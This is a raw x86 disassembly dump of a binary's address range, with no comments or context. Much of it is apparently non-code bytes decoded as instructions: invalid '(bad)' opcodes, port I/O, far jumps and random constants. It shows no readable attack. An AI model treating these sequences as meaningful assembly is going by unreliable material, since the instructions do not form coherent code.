  41890d:	push   ebp
  41890e:	clc    
  41890f:	and    eax,0x9cfe2cd0
  418914:	scas   eax,DWORD PTR es:[edi]
  418915:	outs   dx,DWORD PTR ds:[esi]
  418916:	jno    0x41898c
  418918:	xor    cl,BYTE PTR [edx+eiz*2+0x6d]
  41891c:	mov    bh,0x9e
  41891e:	mov    ebp,0x97190742
  418923:	xchg   esp,eax
  418924:	jp     0x418906
  418926:	adc    bl,dh
  418928:	lds    ebx,FWORD PTR [esi+0x25af633d]
  41892e:	lods   al,BYTE PTR ds:[esi]
  41892f:	mov    ?,WORD PTR [edi+edx*8]
  418932:	xor    al,0x3
  418934:	xor    BYTE PTR [esi+esi*1+0x2c6f1172],ch
  41893b:	outs   dx,DWORD PTR ds:[esi]
  41893c:	ret    0x195a
  41893f:	mov    cl,0x96
  418941:	leave  
  418942:	inc    ebp
  418943:	cmp    dh,BYTE PTR [edi+0x23]
  418946:	cmp    dh,BYTE PTR [esi+0x588d8685]
  41894c:	in     al,0xfd
  41894e:	pushf  
  41894f:	xchg   ebx,eax
  418950:	(bad)  
  418951:	pop    ebp
  418952:	out    0x4f,al
  418954:	nop
  418955:	cs ret 0x2335
  418959:	mov    edx,ebp
  41895b:	sahf   
  41895c:	add    esi,DWORD PTR [edi-0x19f582f7]
  418962:	sti    
  418963:	push   esp
  418964:	pop    esp
  418965:	lods   al,BYTE PTR ds:[esi]
  418966:	lods   al,BYTE PTR ds:[esi]
  418967:	mov    ch,0x3d
  418969:	(bad)  
  41896a:	stos   DWORD PTR es:[edi],eax
  41896b:	adc    bh,bl
  41896d:	cmp    DWORD PTR [edi-0x585f852e],ecx
  418973:	retf   
  418974:	add    eax,0x35c9566
  418979:	ret    
  41897a:	stos   DWORD PTR es:[edi],eax
  41897b:	shl    esi,0x53
  41897e:	mov    ch,0x45
  418980:	xchg   BYTE PTR es:[edx+0x34],bh
  418984:	(bad)  
  418985:	fwait
  418986:	outs   dx,DWORD PTR ds:[esi]
  418987:	xchg   ecx,eax
  418988:	lods   eax,DWORD PTR ds:[esi]
  418989:	push   es
  41898a:	xchg   edi,eax
  41898b:	pop    ebp
  41898c:	xchg   esi,eax
  41898d:	xor    bl,BYTE PTR [ebx-0x12]
  418990:	fwait
  418991:	imul   ebp,ebx,0x11f93e19
  418997:	mov    ds:0x7737413c,al
  41899c:	leave  
  41899d:	es test eax,0x51299fad
  4189a3:	add    DWORD PTR [ebp-0x2a0c105e],ebx
  4189a9:	lods   al,BYTE PTR ds:[esi]
  4189aa:	div    DWORD PTR cs:[ebp+0x3ad934fb]
  4189b1:	xor    DWORD PTR [eax],ebx
  4189b3:	dec    ecx
  4189b4:	lahf   
  4189b5:	xor    bh,BYTE PTR [esi+0x14]
  4189b8:	lock xchg BYTE PTR [esi-0x1831ce49],al
  4189bf:	in     eax,0xea
  4189c1:	pop    ebx
  4189c2:	imul   ebx,DWORD PTR [ebp+0x1e1b0c],0xffffffba
  4189c9:	mov    ds:0xbf8f58a9,al
  4189ce:	gs mov bl,0xc0
  4189d1:	push   eax
  4189d2:	xchg   ebx,eax
  4189d3:	jno    0x4189b0
  4189d5:	and    DWORD PTR [esi-0x25],esi
  4189d8:	arpl   sp,di
  4189da:	cmp    cl,BYTE PTR [ebp+0x58]
  4189dd:	fidiv  WORD PTR [bx+si+0x3]
  4189e1:	jge    0x418990
  4189e3:	and    eax,DWORD PTR [esi+0x1f463564]
  4189e9:	scas   eax,DWORD PTR es:[edi]
  4189ea:	jmp    FWORD PTR [edi+0x46]
  4189ed:	mov    ebx,0x0
	...
  418a56:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0xe2499269
  418a65:	xchg   edx,eax
  418a66:	or     DWORD PTR [bx+di],eax
  418a69:	add    BYTE PTR [eax],al
  418a6b:	add    DWORD PTR [eax],eax
  418a6d:	add    BYTE PTR [esi+ebp*2-0x6deb612a],dh
  418a74:	push   esp
  418a76:	push   eax
  418a77:	popf   
  418a78:	dec    ecx
  418a79:	sti    
  418a7a:	jns    0x418a78
  418a7c:	call   0xc29b1ea3
  418a81:	dec    ebp
  418a82:	adc    al,0x28
  418a84:	popa   
  418a85:	dec    esp
  418a86:	int    0xdc
  418a88:	pop    ecx
  418a89:	pushf  
  418a8a:	iret   
  418a8b:	int    0x6b
  418a8d:	inc    edx
  418a8e:	(bad)  
  418a8f:	mov    eax,0x61559bd7
  418a94:	neg    BYTE PTR [esi-0x3370c365]
  418a9a:	pop    esp
  418a9b:	mov    ebx,0xddb6bf5d
  418aa0:	or     BYTE PTR [esp+edi*2+0x50],cl
  418aa4:	mov    eax,DWORD PTR [esi]
  418aa6:	mov    bh,0x2c
  418aa8:	and    al,bh
  418aaa:	adc    DWORD PTR [ecx+ebx*4+0x36],edi
  418aae:	(bad)  
  418aaf:	mov    ebx,0xe34069bf
  418ab4:	xor    DWORD PTR [edi+0x4f],edi
  418ab7:	and    al,0x31
  418ab9:	mov    bh,0xfd
  418abb:	xlat   BYTE PTR ds:[ebx]
  418abc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418abd:	dec    edi
  418abe:	sar    ecx,cl
  418ac0:	jbe    0x418afa
  418ac2:	and    edx,ebp
  418ac4:	mov    ebx,0x6e6d9df
  418ac9:	inc    esi
  418aca:	psubusw mm3,QWORD PTR [esi+ecx*1+0x11984edf]
  418ad2:	inc    eax
  418ad3:	stos   DWORD PTR es:[edi],eax
  418ad4:	mov    dh,0xac
  418ad6:	mov    bl,0xe9
  418ad8:	and    dl,BYTE PTR [ecx+0x30a9386c]
  418ade:	test   DWORD PTR [ebx-0x5c8caa8d],esp
  418ae4:	mov    eax,0x3ef26d8a
  418aea:	scas   al,BYTE PTR es:[edi]
  418aeb:	rcl    BYTE PTR [esi+0x478adaf0],1
  418af1:	dec    ebx
  418af2:	mov    ds:0x6fdd74b3,eax
  418af7:	or     cl,ch
  418af9:	cmp    edx,esi
  418afb:	ffree  st(0)
  418afd:	or     eax,0x49aaeee
  418b02:	test   al,0x61
  418b04:	pop    ss
  418b05:	mov    ch,ch
  418b07:	mov    ds:0xcd268c00,eax
  418b0c:	xchg   edx,eax
  418b0d:	cmp    al,0xbc
  418b0f:	inc    esi
  418b10:	inc    ebx
  418b11:	pushf  
  418b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b13:	inc    esi
  418b14:	ret    0x75fd
  418b17:	jne    0x418abf
  418b19:	clc    
  418b1a:	stos   DWORD PTR es:[edi],eax
  418b1b:	addr16 call 0x114de84b
  418b21:	neg    DWORD PTR [eax+0x28]
  418b24:	lds    ebx,FWORD PTR [edx]
  418b26:	push   esi
  418b27:	push   edi
  418b28:	push   cs
  418b29:	cdq    
  418b2a:	mov    ebx,0x3e2dad12
  418b2f:	jmp    0x418b8b
  418b31:	ds pop ecx
  418b33:	jns    0x418ad4
  418b35:	outs   dx,DWORD PTR ds:[esi]
  418b36:	jle    0x418aff
  418b38:	gs pop esi
  418b3a:	pop    esi
  418b3b:	aam    0x51
  418b3d:	mov    eax,ds:0xd28075d4
  418b42:	les    edx,FWORD PTR [ecx-0x2aa1f2cd]
  418b48:	rcr    DWORD PTR [eax],1
  418b4a:	sti    
  418b4b:	inc    ebx
  418b4c:	dec    esi
  418b4d:	sbb    eax,0x15477a85
  418b52:	mov    BYTE PTR [esi+eiz*1+0x5d46a96f],0x92
  418b5a:	jp     0x418b12
  418b5c:	dec    ebx
  418b5d:	sub    eax,0x73ab4255
  418b62:	cmp    eax,0x7e9e4fc1
  418b67:	push   ss
  418b68:	inc    ebx
  418b69:	sar    BYTE PTR [ebx],0x79
  418b6c:	repz je 0x418b6f
	...
  418bd3:	add    BYTE PTR [eax],al
  418bd5:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418bd9:	xor    ch,bh
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0xe2
  418be3:	xchg   esi,eax
  418be4:	sub    edi,esp
  418be6:	or     al,BYTE PTR [bx+di]
  418be9:	add    BYTE PTR [eax],al
  418beb:	add    DWORD PTR [eax],eax
  418bed:	add    BYTE PTR [edx],dl
  418bef:	ret    0x42d8
  418bf2:	mov    esi,0x13efc03c
  418bf7:	or     ch,al
  418bf9:	dec    ebp
  418bfa:	jns    0x418c5a
  418bfc:	mov    eax,edx
  418bfe:	jmp    0x7fb2:0x42e7408c
  418c05:	add    eax,0x34ffd273
  418c0a:	push   ss
  418c0b:	sbb    ch,BYTE PTR ds:0x349ec62b
  418c11:	add    eax,0xd2e0ecdb
  418c16:	fcomi  st,st(2)
  418c18:	dec    ecx
  418c19:	lods   eax,DWORD PTR fs:[esi]
  418c1b:	and    DWORD PTR [ebp+0x78],ebp
  418c1e:	jnp    0x418ba4
  418c20:	mov    ah,0x56
  418c22:	mov    esi,0x9607abce
  418c27:	dec    ebx
  418c28:	sub    DWORD PTR [edi],esp
  418c2a:	popa   
  418c2b:	loopne 0x418bfa
  418c2d:	iret   
  418c2e:	pop    ebp
  418c2f:	xchg   BYTE PTR ds:0x151d2eb4,bl
  418c35:	les    esp,FWORD PTR [ebx+0x632b7d41]
  418c3b:	in     al,dx
  418c3c:	pop    esp
  418c3d:	sub    BYTE PTR [ebx],bh
  418c3f:	lods   al,BYTE PTR ds:[esi]
  418c40:	fcom   DWORD PTR [edi]
  418c42:	mov    dh,0x2
  418c44:	retf   
  418c45:	repz neg DWORD PTR [ebx+0x10]
  418c49:	test   DWORD PTR [edi-0xbd2add0],edx
  418c4f:	and    edx,DWORD PTR [esi+0x732152e1]
  418c55:	mov    dh,0xea
  418c57:	jns    0x418c32
  418c59:	jecxz  0x418c5f
  418c5b:	sbb    al,0x4b
  418c5d:	cmp    BYTE PTR [eax-0x31],bh
  418c60:	(bad)  
  418c62:	idiv   BYTE PTR [ecx-0x40]
  418c65:	cmp    DWORD PTR [esi-0x41],ecx
  418c68:	sub    BYTE PTR [eax-0x2dadb752],dl
  418c6e:	sub    al,0x1f
  418c70:	or     bh,BYTE PTR [esp+ebx*1]
  418c73:	mov    dh,0x50
  418c75:	sbb    BYTE PTR [edx-0x2bf514b5],cl
  418c7b:	sbb    BYTE PTR [esi],dl
  418c7d:	jl     0x418c5b
  418c7f:	adc    DWORD PTR [edx-0x6de70be7],edi
  418c85:	dec    esi
  418c86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c87:	sub    BYTE PTR [ebp+0x2a71db29],cl
  418c8d:	aas    
  418c8e:	jge    0x418ccf
  418c90:	or     eax,0x701648b6
  418c95:	jo     0x418c3e
  418c97:	out    0x41,eax
  418c99:	imul   eax,DWORD PTR [eax],0x7d99d748
  418c9f:	inc    esi
  418ca0:	push   edi
  418ca1:	or     dl,BYTE PTR [edx+0x5c]
  418ca4:	mov    ch,0xca
  418ca6:	dec    ebx
  418ca7:	pop    ecx
  418ca8:	mov    cl,0xfb
  418caa:	pop    es
  418cab:	pop    ecx
  418cac:	or     DWORD PTR [edi-0x20545d3d],ebx
  418cb2:	cmc    
  418cb3:	mov    eax,0xd52235db
  418cb8:	inc    edi
  418cb9:	shrd   DWORD PTR [ebx+0x39],eax,cl
  418cbd:	xchg   edi,edx
  418cbf:	xor    bl,BYTE PTR [ebx+eiz*1]
  418cc2:	mov    cl,0x79
  418cc4:	inc    edx
  418cc5:	sahf   
  418cc6:	fld    QWORD PTR [ebx]
  418cc8:	adc    BYTE PTR ds:0x4236ca62,bl
  418cce:	sahf   
  418ccf:	xchg   ecx,eax
  418cd0:	jecxz  0x418c84
  418cd2:	(bad)  
  418cd3:	adc    ebp,DWORD PTR [edx+0x7e11d003]
  418cd9:	icebp  
  418cda:	fisttp DWORD PTR [edx+0x48]
  418cdd:	xlat   BYTE PTR ds:[ebx]
  418cde:	or     ebx,DWORD PTR [edi]
  418ce0:	jmp    0x28d410de
  418ce5:	cli    
  418ce6:	mov    bh,0x3d
  418ce8:	lods   al,BYTE PTR ds:[esi]
  418ce9:	stos   BYTE PTR es:[edi],al
  418cea:	mov    ah,0x4
  418cec:	mov    ch,0xc5
	...
  418d56:	sti    
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	rcl    ch,cl
  418d63:	xchg   ecx,eax
  418d64:	adc    BYTE PTR [edi+eiz*2],0xb
  418d68:	add    DWORD PTR [eax],eax
  418d6a:	add    BYTE PTR [ecx],al
  418d6c:	add    BYTE PTR [eax],al
  418d6e:	pop    ebx
  418d6f:	adc    eax,0x5e106e13
  418d74:	aas    
  418d75:	jo     0x418d8e
  418d77:	cli    
  418d78:	sub    al,0x64
  418d7a:	adc    dl,BYTE PTR [edx-0x65]
  418d7d:	push   es
  418d7e:	aad    0xdb
  418d80:	mov    eax,0x2c5bfc53
  418d85:	outs   dx,BYTE PTR ds:[esi]
  418d86:	sbb    al,0xec
  418d88:	add    eax,0xca461b80
  418d8d:	(bad)  
  418d8e:	(bad)  
  418d8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d90:	cmp    ecx,ebx
  418d92:	cmp    dh,al
  418d94:	popf   
  418d95:	jp     0x418d96
  418d97:	adc    eax,0x3a099348
  418d9c:	xchg   esp,eax
  418d9d:	pop    eax
  418d9e:	in     al,0x18
  418da0:	push   ss
  418da1:	or     ch,al
  418da3:	xor    esi,DWORD PTR [ebx-0x252d8440]
  418da9:	ret    
  418daa:	std    
  418dab:	push   esp
  418dac:	cmp    edi,esp
  418dae:	jae    0x418dc9
  418db0:	cmp    DWORD PTR [eax-0x5d],ebp
  418db3:	dec    ebx
  418db4:	fstp   QWORD PTR [edx-0x43d60ebd]
  418dba:	(bad)  
  418dbb:	mov    al,0x39
  418dbd:	aad    0xf2
  418dbf:	mov    edx,0xe9555806
  418dc4:	push   cs
  418dc5:	xchg   esi,eax
  418dc6:	in     al,0x66
  418dc8:	and    dh,ah
  418dca:	dec    esp
  418dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dcc:	repnz xor ch,BYTE PTR [ebp-0xc5f6b39]
  418dd3:	xchg   esp,eax
  418dd4:	cmp    eax,0x9fb5f694
  418dd9:	push   0x5a
  418ddb:	adc    BYTE PTR [edi],cl
  418ddd:	sbb    BYTE PTR [ebx-0x41fb7bd5],bl
  418de3:	aaa    
  418de4:	mov    ecx,0xe5baf918
  418de9:	sub    BYTE PTR [ebp+ebx*1+0x14],dh
  418ded:	arpl   WORD PTR ds:0x6530883f,cx
  418df3:	out    0xa2,eax
  418df5:	cdq    
  418df6:	ror    BYTE PTR [esi+0x4fb0e858],0xc0
  418dfd:	in     eax,dx
  418dfe:	dec    eax
  418dff:	dec    ebp
  418e00:	int3   
  418e01:	adc    al,0x6a
  418e03:	and    ecx,ecx
  418e05:	or     eax,0x922104bb
  418e0a:	or     DWORD PTR ds:0x1049797c,esi
  418e10:	(bad)  
  418e11:	pop    edi
  418e12:	mov    dl,0x36
  418e14:	imul   ebp,DWORD PTR ss:[edi+0x1a],0xddb9764f
  418e1c:	dec    ebx
  418e1d:	mov    ah,0x13
  418e1f:	sbb    BYTE PTR [edx],0xf6
  418e22:	add    BYTE PTR [esi+0x7f0c05ce],ah
  418e28:	xchg   ebx,eax
  418e29:	paddusb mm6,mm0
  418e2c:	repnz repz fsub QWORD PTR [eax+0x2e4da174]
  418e34:	cmp    eax,0x30c5fb03
  418e39:	(bad)  
  418e3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e3b:	ins    BYTE PTR es:[edi],dx
  418e3c:	xchg   BYTE PTR [ecx+eiz*4+0x53],ah
  418e40:	and    al,bh
  418e42:	xchg   esi,eax
  418e43:	pop    ecx
  418e44:	cwde   
  418e45:	sub    al,0x6e
  418e47:	dec    eax
  418e48:	addr16 popf 
  418e4a:	mov    edx,0xc8e982ab
  418e4f:	cmp    edi,DWORD PTR [edx]
  418e51:	inc    ecx
  418e52:	push   0x520ee5d2
  418e57:	jmp    0x418e72
  418e59:	lods   eax,DWORD PTR ds:[esi]
  418e5a:	pop    es
  418e5b:	mov    ds:0x328d92a7,al
  418e60:	sbb    eax,0x749030e
  418e65:	jl     0x418dec
  418e67:	xor    al,BYTE PTR [edx]
  418e69:	inc    edx
  418e6a:	ror    dl,cl
  418e6c:	jno    0x418e0f
	...
  418ed6:	push   cs
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx+0x73]
  418ee3:	nop
  418ee4:	loope  0x418ee8
  418ee6:	addr16 or al,0x1
  418ee9:	add    BYTE PTR [eax],al
  418eeb:	add    DWORD PTR [eax],eax
  418eed:	add    BYTE PTR [esi+eiz*8-0x6a],al
  418ef1:	pop    esi
  418ef2:	mov    eax,0x843b6ba5
  418ef7:	or     edx,DWORD PTR [edx-0x48]
  418efa:	sub    BYTE PTR [eax+edi*2-0x77b0082d],bl
  418f01:	push   0x1a
  418f03:	cmp    al,0x3f
  418f05:	mov    ah,0xe8
  418f07:	mov    edi,0x57fb83ea
  418f0c:	(bad)  
  418f0d:	fwait
  418f0e:	mov    DWORD PTR [edi],ebx
  418f10:	pop    ebx
  418f11:	add    esi,DWORD PTR [ebx+esi*1-0x53a4ab75]
  418f18:	hlt    
  418f19:	fs cwde 
  418f1b:	or     BYTE PTR [ebx],bh
  418f1d:	test   BYTE PTR [esi-0x4fec622c],ch
  418f23:	test   DWORD PTR ds:0x30c72662,ecx
  418f29:	pushf  
  418f2a:	daa    
  418f2b:	jns    0x418f55
  418f2d:	lods   al,BYTE PTR ds:[esi]
  418f2e:	inc    ebx
  418f2f:	cmp    eax,0x84b37462
  418f34:	int    0xc4
  418f36:	and    dh,al
  418f38:	shl    DWORD PTR [eax-0x6b],0xd
  418f3c:	cmp    DWORD PTR [eax-0x7d],edi
  418f3f:	jae    0x418fab
  418f41:	xor    edx,esi
  418f43:	push   ds
  418f44:	loopne 0x418f97
  418f46:	cld    
  418f47:	mov    eax,ds:0x8fed07df
  418f4c:	push   ss
  418f4d:	mov    bh,BYTE PTR [ecx+edi*2]
  418f50:	push   edi
  418f51:	(bad)  
  418f52:	push   ebp
  418f53:	retf   0x33f3
  418f56:	pop    edi
  418f57:	xor    eax,0x2fe2d067
  418f5c:	enter  0xab9d,0x99
  418f60:	xor    eax,0x168097d7
  418f65:	(bad)  
  418f66:	imul   ebp,DWORD PTR [edi],0xbccba48f
  418f6c:	push   esi
  418f6d:	inc    ecx
  418f6e:	xchg   edi,eax
  418f6f:	popf   
  418f70:	pop    ds
  418f71:	popf   
  418f72:	out    0xe4,eax
  418f74:	je     0x418fa6
  418f76:	xor    DWORD PTR [ecx+0x6872c918],edx
  418f7c:	out    0xde,eax
  418f7e:	test   al,0x9e
  418f80:	ror    BYTE PTR [ebx],0x64
  418f83:	xchg   esi,eax
  418f84:	pop    eax
  418f85:	jp     0x418ff8
  418f87:	add    ch,BYTE PTR [ebx-0xa7a7563]
  418f8d:	sbb    DWORD PTR [ebx],esp
  418f8f:	fdiv   DWORD PTR [eax-0x4b0b858a]
  418f95:	mov    ah,0xee
  418f97:	stc    
  418f98:	mov    bh,0x4
  418f9a:	repnz pushf 
  418f9c:	js     0x418fc0
  418f9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f9f:	and    edi,DWORD PTR [eax+0x2c]
  418fa2:	inc    ebp
  418fa3:	dec    esp
  418fa4:	(bad)  
  418fa5:	pop    ss
  418fa6:	daa    
  418fa7:	inc    ebp
  418fa8:	mov    ds:0x3feba094,al
  418fad:	sub    BYTE PTR [eax+ecx*2+0x65],0xfb
  418fb2:	sahf   
  418fb3:	dec    esp
  418fb4:	sub    DWORD PTR [eax],ebp
  418fb6:	mov    ebp,0xc09f9599
  418fbb:	fs xor ebx,ecx
  418fbe:	inc    ebx
  418fbf:	scas   eax,DWORD PTR es:[edi]
  418fc0:	dec    ebx
  418fc1:	or     ebp,esi
  418fc3:	out    0xb,eax
  418fc5:	xor    al,0x7b
  418fc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fc8:	pop    edi
  418fc9:	(bad)  
  418fca:	mov    ebx,0xfbac1a8e
  418fcf:	mov    ch,BYTE PTR [ebp+0x1a]
  418fd2:	and    eax,eax
  418fd4:	mov    edi,0x236495e9
  418fd9:	lods   al,BYTE PTR ds:[esi]
  418fda:	jmp    0x418fd2
  418fdc:	jb     0x418f6f
  418fde:	aaa    
  418fdf:	out    0x25,al
  418fe1:	js     0x41901e
  418fe3:	xor    DWORD PTR [esi],esp
  418fe5:	xor    dh,BYTE PTR [esi-0x36]
  418fe8:	xchg   esi,eax
  418fe9:	pop    ebx
  418fea:	jne    0x418f77
  418fec:	ret    0xe0
	...
  419053:	add    BYTE PTR [eax],al
  419055:	add    BYTE PTR [edi+edx*4],bl
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx-0x66150e59]
  419063:	arpl   WORD PTR [edx+0x10d6719],si
  419069:	add    BYTE PTR [eax],al
  41906b:	add    DWORD PTR [eax],eax
  41906d:	add    ch,bl
  41906f:	xchg   esp,eax
  419070:	mov    WORD PTR [ecx+0x78],es
  419073:	or     BYTE PTR ds:0x13df9510,dh
  419079:	retf   
  41907a:	cwde   
  41907b:	push   0x9f2e6756
  419080:	cli    
  419081:	pushf  
  419082:	outs   dx,DWORD PTR ds:[esi]
  419083:	je     0x4190c0
  419085:	jmp    0x4190d4
  419087:	hlt    
  419088:	xor    BYTE PTR ds:[esi+0x68],bh
  41908c:	neg    BYTE PTR [edx]
  41908e:	push   edi
  41908f:	out    0x98,eax
  419091:	std    
  419092:	cmp    DWORD PTR [esi],edx
  419094:	mov    BYTE PTR [edx],0x60
  419097:	aad    0xc5
  419099:	and    eax,0x71304248
  41909e:	test   BYTE PTR [ebx-0x3b],al
  4190a1:	add    eax,0x22ccd0f9
  4190a6:	push   ebp
  4190a7:	jmp    0x41908a
  4190a9:	test   BYTE PTR [esi+0x6e],al
  4190ac:	test   cl,al
  4190ae:	lods   al,BYTE PTR ds:[esi]
  4190af:	ficom  WORD PTR [esi+0x1]
  4190b2:	ds xor ch,ch
  4190b5:	jno    0x4190d4
  4190b7:	(bad)  
  4190b8:	or     eax,0x5c681ad
  4190bd:	leave  
  4190be:	sbb    al,BYTE PTR [ebx+0x72]
  4190c1:	or     DWORD PTR [ebp+0x143bdc9e],ecx
  4190c7:	(bad)
  4190cb:	add    BYTE PTR [ebx-0x69],bl
  4190ce:	xor    ebx,DWORD PTR ds:0x8814eb5c
  4190d4:	push   edx
  4190d5:	mov    ch,0x41
  4190d7:	adc    DWORD PTR [esi],ebx
  4190d9:	mov    cl,0x3c
  4190db:	mov    bh,0xc0
  4190dd:	out    0xd7,eax
  4190df:	add    al,0x90
  4190e1:	stos   BYTE PTR es:[edi],al
  4190e2:	push   edi
  4190e3:	adc    al,0xf5
  4190e5:	dec    ebx
  4190e6:	lods   eax,DWORD PTR ds:[esi]
  4190e7:	nop
  4190e8:	inc    esp
  4190e9:	xchg   edi,eax
  4190ea:	retf   
  4190eb:	mov    al,ds:0x7ddedc9f
  4190f0:	fisub  WORD PTR [ebx-0x2]
  4190f3:	pop    edi
  4190f4:	iret   
  4190f5:	push   esp
  4190f6:	pop    eax
  4190f7:	dec    esi
  4190f8:	cmc    
  4190f9:	int    0x5a
  4190fb:	mov    ds,WORD PTR [edx-0x7e]
  4190fe:	in     al,0xdf
  419100:	daa    
  419101:	ins    BYTE PTR es:[edi],dx
  419102:	test   BYTE PTR ds:[ecx+0x3117ec8b],ah
  419109:	cmp    eax,0xdb743dbc
  41910e:	push   esp
  41910f:	pop    esp
  419110:	ins    BYTE PTR es:[edi],dx
  419111:	dec    eax
  419112:	adc    ebp,DWORD PTR [ebp-0x52]
  419115:	cmp    ch,BYTE PTR [edx]
  419117:	lds    ecx,FWORD PTR [esi+0x1f]
  41911a:	lock pop es
  41911c:	loope  0x4190a1
  41911e:	ins    DWORD PTR es:[edi],dx
  41911f:	je     0x4190ae
  419121:	call   0xa07e:0x36c95c31
  419128:	sbb    eax,0xfd9d762b
  41912d:	or     cl,BYTE PTR [edi+0x69f3ac1e]
  419133:	cli    
  419134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419135:	jns    0x41919c
  419137:	aad    0x3b
  419139:	xchg   edi,eax
  41913a:	mov    cl,0x9
  41913c:	push   esp
  41913d:	(bad)  
  41913e:	jmp    0x1880:0xc227df05
  419145:	adc    BYTE PTR [esp+eiz*2-0x261a431c],ch
  41914c:	mov    ds,WORD PTR [esi+edx*4]
  41914f:	(bad)  
  419150:	sub    eax,0x7bb6cfe2
  419155:	inc    eax
  419156:	mov    esp,0x904a2ed6
  41915b:	dec    eax
  41915c:	jmp    0x325b0b36
  419161:	fdivp  st(3),st
  419163:	pusha  
  419164:	dec    edi
  419165:	dec    esi
  419166:	inc    ecx
  419167:	sbb    edx,edx
  419169:	stos   DWORD PTR es:[edi],eax
  41916a:	cwde   
  41916b:	inc    ebx
  41916c:	push   edx
  41916d:	pop    ebp
	...
  4191d6:	scas   eax,DWORD PTR es:[edi]
  4191d7:	test   DWORD PTR [esi-0xa441be],ebx
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     cl,bl
  4191e3:	or     eax,0xe67d241
  4191e8:	add    DWORD PTR [eax],eax
  4191ea:	add    BYTE PTR [ecx],al
  4191ec:	add    BYTE PTR [eax],al
  4191ee:	arpl   WORD PTR ds:0x9b415963,dx
  4191f4:	iret   
  4191f5:	push   edi
  4191f6:	jmp    0xda7e0033
  4191fb:	lock sbb edx,esi
  4191fe:	mov    edi,0xb4f44bed
  419203:	adc    BYTE PTR [ebp-0x2f],cl
  419206:	sub    bl,cl
  419208:	xor    ch,al
  41920a:	adc    al,0x68
  41920c:	rcr    DWORD PTR ds:[edx+eiz*4],0x9
  419211:	cmp    eax,edx
  419213:	mov    al,0x31
  419215:	jne    0x4191ba
  419217:	(bad)  
  419219:	test   dh,0x4
  41921c:	pop    ds
  41921d:	sub    al,0x86
  41921f:	jnp    0x4191ee
  419221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419222:	aas    
  419223:	ret    
  419224:	sti    
  419225:	psllw  mm4,mm5
  419228:	mov    dl,0x54
  41922a:	addr16 js 0x419224
  41922d:	inc    esi
  41922e:	jnp    0x4191e2
  419230:	inc    eax
  419231:	inc    esi
  419232:	xchg   ebp,eax
  419233:	call   0xfbabcd85
  419238:	retf   0xa140
  41923b:	mov    WORD PTR [eax+0x71],?
  41923e:	js     0x4191eb
  419240:	push   0x79c86444
  419245:	mov    edx,0xcfce05a0
  41924a:	jp     0x419272
  41924c:	and    al,0xa8
  41924e:	adc    esp,edx
  419250:	and    esi,0x43
  419253:	or     dh,BYTE PTR [esi]
  419255:	mov    esp,0xb40d6072
  41925a:	aam    0xfe
  41925c:	cmp    edx,ebp
  41925e:	and    eax,0xb11bbb79
  419263:	icebp  
  419264:	push   esi
  419265:	fst    DWORD PTR [ecx+0x23]
  419268:	or     dh,bl
  41926a:	rol    DWORD PTR [edi+edi*1+0x5b],1
  41926e:	sar    DWORD PTR [ebx-0x2661b407],1
  419274:	ss xchg eax,esp
  419277:	jg     0x41925a
  419279:	mov    cl,0x86
  41927b:	jbe    0x4192de
  41927d:	xor    ecx,DWORD PTR [ebx]
  41927f:	sub    eax,0xad9df6a0
  419284:	adc    ah,dh
  419286:	sbb    eax,0x215b27a3
  41928b:	icebp  
  41928c:	and    al,0xb8
  41928e:	test   DWORD PTR [esp+edx*2],eax
  419291:	pop    edi
  419292:	addr16 and al,0x9b
  419295:	shl    ah,0x85
  419298:	mov    ah,0x1c
  41929a:	jmp    0x41924a
  41929c:	call   0x72817f87
  4192a1:	push   ebx
  4192a2:	or     ebx,DWORD PTR [ecx-0x4bdd2cc3]
  4192a8:	stos   DWORD PTR es:[edi],eax
  4192a9:	mov    ecx,0x7d73f767
  4192ae:	jmp    0x5718d2dd
  4192b3:	out    dx,al
  4192b4:	xchg   edx,eax
  4192b5:	or     eax,0x6ed8aa6f
  4192ba:	add    edi,DWORD PTR [edx+0x6bcb37fc]
  4192c0:	xchg   esi,eax
  4192c1:	int    0x61
  4192c3:	js     0x419268
  4192c5:	adc    DWORD PTR [ebx-0x36249e32],edx
  4192cb:	dec    ebx
  4192cc:	out    0x1a,eax
  4192ce:	adc    dl,BYTE PTR [ecx-0x7699a8c9]
  4192d4:	(bad)  [ecx]
  4192d6:	call   0xc76ddb0f
  4192db:	in     al,0xe3
  4192dd:	mov    ebp,0x1e0ccfb4
  4192e2:	call   0xd686:0xd79e4195
  4192e9:	pop    esi
  4192ea:	mov    al,ds:0xb1935b
	...
  419353:	add    BYTE PTR [eax],al
  419355:	add    BYTE PTR [eax-0xcc4519],ah
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	mov    ebp,0x67c28f3c
  419367:	sgdtd  [eax]
  41936a:	add    BYTE PTR [ecx],al
  41936c:	add    BYTE PTR [eax],al
  41936e:	or     eax,0xfb6f6927
  419373:	faddp  st(4),st
  419375:	out    0xc8,eax
  419377:	aam    0xbd
  419379:	sbb    edx,0x56
  41937c:	mov    al,ds:0xdf634f84
  419381:	fadd   DWORD PTR [eax+0x1d]
  419384:	adc    DWORD PTR [eax-0x3db33df3],edx
  41938a:	dec    eax
  41938b:	push   es
